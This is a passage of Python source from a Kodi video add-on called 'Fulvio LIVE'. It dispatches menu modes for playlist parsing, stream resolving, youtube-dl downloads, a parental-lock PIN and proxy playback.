        ua = 'Mozilla/5.0 (X11 Ubuntu Linux x86_64 rv:27.0) Gecko/20100101 Firefox/27.0'
    if select == 2:
        ua = 'Mozilla/5.0 (Linux Android 4.3 Galaxy Nexus Build/JWR66Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.166 Mobile Safari/537.36 OPR/20.0.1396.73172'
    if select == 3:
        ua = 'VLC/2.2.2 LibVLC/2.2.17'
    if select == 4:
        keyboard = xbmc.Keyboard('', 'Fulvio LIVE: Custom User-Agent')
        keyboard.doModal()
        text = keyboard.getText()
        if text == '':
            del text
        ua = text.strip().replace(';','')
    if not ua == '':
        u = '|User-Agent='+ua
    else:
        u = ''

    data = makeRequest(url)
    match = re.compile(r'#EXTINF:.+?,(it[^a-zA-Z0-9].+?)\s+(http.+\.(?:ts|m3u8))', re.I).findall(data)
    total = len(match)
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    for channel_name, stream_url in match:
        addLink(stream_url+u, '[B][COLOR skyblue]'+channel_name+'[/COLOR][/B]',thumbnail,'','','','',True,None,'',total)
    match = re.compile(r'#EXTINF:.+?,((?!it[^a-zA-Z0-9]).+?)\s+(http.+\.(?:ts|m3u8))', re.I).findall(data)
    total = len(match)
    thumbnail = 'https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    for channel_name, stream_url in match:
        addLink(stream_url+u, '[B][COLOR skyblue]'+channel_name+'[/COLOR][/B]',thumbnail,'','','','',True,None,'',total)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==113:
    cdir = os.path.join(xbmc.translatePath("special://temp"),"files")
    TempName = base64.urlsafe_b64encode(url)
    tmp = os.path.join(cdir, TempName)
    if os.path.isfile(tmp):
        os.remove(tmp)

elif mode==114:
    update()

elif mode==115:
    xbmcaddon.Addon(AddonID).openSettings()

elif mode==116:
    Cacheclean()

elif mode==117:
    item = xbmcgui.ListItem(path=url , label = 'TEST', iconImage = "DefaultVideo.png", thumbnailImage = "DefaultVideo.png" )
    xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, item)

elif mode==12:
    addon_log("setResolvedUrl")
    if not url.startswith("plugin://plugin") or not any(x in url for x in g_ignoreSetResolved):#not url.startswith("plugin://plugin.video.f4mTester") :
        setres=True
        if '$$LSDirect$$' in url:
            url=url.replace('$$LSDirect$$','')
            setres=False
        item = xbmcgui.ListItem(path=url)
        if not setres:
            xbmc.Player().play(url)
        else: 
            xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, item)
    else:
        xbmc.executebuiltin('XBMC.RunPlugin('+url+')')

elif mode==120:
    addon_log("Url to Sod")
    url=url.replace('&mode=120','').replace('plugin://plugin.video.fulviolive/?url=','')
    xbmc.executebuiltin('XBMC.RunPlugin('+url+')')

elif mode==121:
    addon_log("xvideos")
    url=Xvideos(url)
    playsetresolved(url,name,iconimage)
    
elif mode==122:
    addon_log("fastvideo")
    url=url.replace('&mode=122','').replace('plugin://plugin.video.fulviolive/?url=','')
    url=Fastvideo(url)
    playsetresolved(url,name,iconimage)

elif mode==123:
    addon_log("nbamodded")
    nbamodded('http://bit.ly/2l9Qkmu')

elif mode==124:
    addon_log("Ustreamix")
    url=Ustreamix(url)
    # url = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(url)+'&amp;streamtype=HLSRETRY&name=STREAMING&amp;iconImage=https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
    # xbmc.executebuiltin('XBMC.RunPlugin('+url+')')
    playsetresolved(url,name,iconimage)

elif mode==13:
    addon_log("play_playlist")
    play_playlist(name, playlist)

elif mode==14:
    addon_log("get_xml_database")
    get_xml_database(url)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==15:
    addon_log("browse_xml_database")
    get_xml_database(url, True)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==16:
    addon_log("browse_community")
    getCommunitySources(url,browse=True)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==17 or mode==117:
    addon_log("getRegexParsed")

    data=None
    if regexs and 'listrepeat' in urllib.unquote_plus(regexs):
        listrepeat,ret,m,regexs, cookieJar =getRegexParsed(regexs, url)
        #print listrepeat,ret,m,regexs
        d=''
#        print 'm is' , m
#        print 'regexs',regexs
        regexname=m['name']
        existing_list=regexs.pop(regexname)
 #       print 'final regexs',regexs,regexname
        url=''
        import copy
        ln=''
        rnumber=0
        for obj in ret:
            #print 'obj',obj
            try:
                rnumber+=1
                newcopy=copy.deepcopy(regexs)
    #            print 'newcopy',newcopy, len(newcopy)
                listrepeatT=listrepeat
                i=0
                for i in range(len(obj)):
    #                print 'i is ',i, len(obj), len(newcopy)
                    if len(newcopy)>0:
                        for the_keyO, the_valueO in newcopy.iteritems():
                            if the_valueO is not None:
                                for the_key, the_value in the_valueO.iteritems():
                                    if the_value is not None:                                
        #                                print  'key and val',the_key, the_value
        #                                print 'aa'
        #                                print '[' + regexname+'.param'+str(i+1) + ']'
        #                                print repr(obj[i])
                                        if type(the_value) is dict:
                                            for the_keyl, the_valuel in the_value.iteritems():
                                                if the_valuel is not None:
                                                    val=None
                                                    if isinstance(obj,tuple):                                                    
                                                        try:
                                                           val= obj[i].decode('utf-8') 
                                                        except: 
                                                            val= obj[i] 
                                                    else:
                                                        try:
                                                            val= obj.decode('utf-8') 
                                                        except:
                                                            val= obj
                                                    
                                                    if '[' + regexname+'.param'+str(i+1) + '][DE]' in the_valuel:
                                                        the_valuel=the_valuel.replace('[' + regexname+'.param'+str(i+1) + '][DE]', unescape(val))
                                                    the_value[the_keyl]=the_valuel.replace('[' + regexname+'.param'+str(i+1) + ']', val)
                                                    #print 'first sec',the_value[the_keyl]
                                                    
                                        else:
                                            val=None
                                            if isinstance(obj,tuple):
                                                try:
                                                     val=obj[i].decode('utf-8') 
                                                except:
                                                    val=obj[i] 
                                            else:
                                                try:
                                                    val= obj.decode('utf-8') 
                                                except:
                                                    val= obj
                                            if '[' + regexname+'.param'+str(i+1) + '][DE]' in the_value:
                                                #print 'found DE',the_value.replace('[' + regexname+'.param'+str(i+1) + '][DE]', unescape(val))
                                                the_value=the_value.replace('[' + regexname+'.param'+str(i+1) + '][DE]', unescape(val))

                                            the_valueO[the_key]=the_value.replace('[' + regexname+'.param'+str(i+1) + ']', val)
                                            #print 'second sec val',the_valueO[the_key]

                    val=None
                    if isinstance(obj,tuple):
                        try:
                            val=obj[i].decode('utf-8')
                        except:
                            val=obj[i]
                    else:
                        try:
                            val=obj.decode('utf-8')
                        except: 
                            val=obj
                    if '[' + regexname+'.param'+str(i+1) + '][DE]' in listrepeatT:
                        listrepeatT=listrepeatT.replace('[' + regexname+'.param'+str(i+1) + '][DE]',val)
                    listrepeatT=listrepeatT.replace('[' + regexname+'.param'+str(i+1) + ']',escape(val))
#                    print listrepeatT
                listrepeatT=listrepeatT.replace('[' + regexname+'.param'+str(0) + ']',str(rnumber)) 
                
                try:
                    if cookieJar and '[' + regexname+'.cookies]' in listrepeatT:
                        listrepeatT=listrepeatT.replace('[' + regexname+'.cookies]',getCookiesString(cookieJar)) 
                except: pass
                
                #newcopy = urllib.quote(repr(newcopy))
    #            print 'new regex list', repr(newcopy), repr(listrepeatT)
    #            addLink(listlinkT,listtitleT.encode('utf-8', 'ignore'),listthumbnailT,'','','','',True,None,newcopy, len(ret))
                regex_xml=''
#                print 'newcopy',newcopy
                if len(newcopy)>0:
                    regex_xml=d2x(newcopy,'lsproroot')
                    regex_xml=regex_xml.split('<lsproroot>')[1].split('</lsproroot')[0]
              
                #ln+='\n<item>%s\n%s</item>'%(listrepeatT.encode("utf-8"),regex_xml)   
                try:
                    ln+='\n<item>%s\n%s</item>'%(listrepeatT,regex_xml)
                except: ln+='\n<item>%s\n%s</item>'%(listrepeatT.encode("utf-8"),regex_xml)
            except: traceback.print_exc(file=sys.stdout)
#            print repr(ln)
#            print newcopy
                
#            ln+='</item>'
        
        addon_log(repr(ln))
        getData('','',ln)
        xbmcplugin.endOfDirectory(int(sys.argv[1]))
    else:
        url,setresolved = getRegexParsed(regexs, url)
        #print repr(url),setresolved,'imhere'
        if url:
            if '$PLAYERPROXY$=' in url:
                url,proxy=url.split('$PLAYERPROXY$=')
                print 'proxy',proxy
                #Jairox mod for proxy auth
                proxyuser = None
                proxypass = None
                if len(proxy) > 0 and '@' in proxy:
                    proxy = proxy.split(':')
                    proxyuser = proxy[0]
                    proxypass = proxy[1].split('@')[0]
                    proxyip = proxy[1].split('@')[1]
                    port = proxy[2]
                else:
                    proxyip,port=proxy.split(':')

                playmediawithproxy(url,name,iconimage,proxyip,port, proxyuser,proxypass) #jairox
            else:
                playsetresolved(url,name,iconimage,setresolved,regexs)
        else:
            xbmc.executebuiltin("XBMC.Notification(Fulvio LIVE,Failed to extract regex. - "+"this"+",4000,"+icon+")")

elif mode==18:
    addon_log("youtubedl")
    try:
        import youtubedl
    except Exception:
        xbmc.executebuiltin("XBMC.Notification(Fulvio LIVE,Please [COLOR yellow]install Youtube-dl[/COLOR] module ,10000,"")")
    stream_url=youtubedl.single_YD(url)
    playsetresolved(stream_url,name,iconimage)

elif mode==19:
    addon_log("Genesiscommonresolvers")
    playsetresolved (urlsolver(url),name,iconimage,True)

elif mode==21:
    addon_log("download current file using youtube-dl service")
    name = BBTagRemove(name)
    ytdl_download('',name,'video')

elif mode==23:
    addon_log("get info then download")
    ytdl_download(url,name,'video')

elif mode==24:
    addon_log("Audio only youtube download")
    ytdl_download(url,name,'audio')

elif mode==25:
    addon_log("Searchin Other plugins")
    _search(url,name)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==55:
    addon_log("enabled lock")
    parentalblockedpin =addon.getSetting('parentalblockedpin')
    keyboard = xbmc.Keyboard('','Enter Pin')
    keyboard.doModal()
    if not (keyboard.isConfirmed() == False):
        newStr = keyboard.getText()
        if newStr==parentalblockedpin:
            addon.setSetting('parentalblocked', "false")
            xbmc.executebuiltin("XBMC.Notification(Fulvio LIVE,Parental Block Disabled,5000,"+icon+")")
        else:
            xbmc.executebuiltin("XBMC.Notification(Fulvio LIVE,Wrong Pin??,5000,"+icon+")")
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==56:
    addon_log("disable lock")
    addon.setSetting('parentalblocked', "true")
    xbmc.executebuiltin("XBMC.Notification(Fulvio LIVE,Parental block enabled,5000,"+icon+")")
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==53:
    addon_log("Requesting JSON-RPC Items")
    pluginquerybyJSON(url)
    #xbmcplugin.endOfDirectory(int(sys.argv[1]))

if not viewmode==None:
   print 'setting view mode'
   xbmc.executebuiltin("Container.SetViewMode(%s)"%viewmode)
   
elif mode==1000:
    checkforupdates(REMOTE_VERSION_FILE, LOCAL_VERSION_FILE,0)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))
   
elif mode==1001:
    addon_log("LoginFulvio")
    LoginFulvio(url)
    
elif mode==1002:
    addon_log("LoginFulvio2")
    LoginFulvio2(url)

elif mode==1003:
    RestoreRepo(file)

elif mode==1004:
    fulviodownload()

elif mode==1005:
    Shanis()

elif mode==1006:
    Sportdevil()

elif mode==1007:
    Plexusrepo()

elif mode==1009:
    addon_log("LoginFulvio3")
    LoginFulvio3(url)
